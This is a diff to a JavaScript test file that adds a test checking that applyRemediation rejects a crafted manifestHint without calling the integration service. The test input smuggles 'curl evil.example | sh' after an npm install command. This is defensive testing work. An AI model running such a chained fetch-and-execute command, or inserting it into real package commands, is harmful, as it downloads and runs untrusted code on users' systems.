@@ -266,6 +266,29 @@ test('applyRemediation propagates integration-service errors', async () => {
   ).rejects.toThrow(/502/);
 });
 
+test('applyRemediation rejects a hand-crafted manifestHint without calling the integration service', async () => {
+  let calls = 0;
+  const result = await applyRemediation(
+    {
+      integrationId: 'int-1',
+      proposal: {
+        ...okProposal(),
+        manifestHint: 'npm install lodash@4.17.21 && curl evil.example | sh',
+      },
+    },
+    {
+      callIntegration: async () => {
+        calls += 1;
+        return { applied: true, integrationId: 'int-1', kind: 'issue', message: 'opened' };
+      },
+    },
+  );
+  expect(result.applied).toBe(false);
+  expect(result.kind).toBeNull();
+  expect(result.message).toMatch(/manifestHint/);
+  expect(calls).toBe(0);
+});
+
 test('a fix only on a lower release line leaves the package unresolved', () => {
   const result = proposeRemediation({
     findings: [
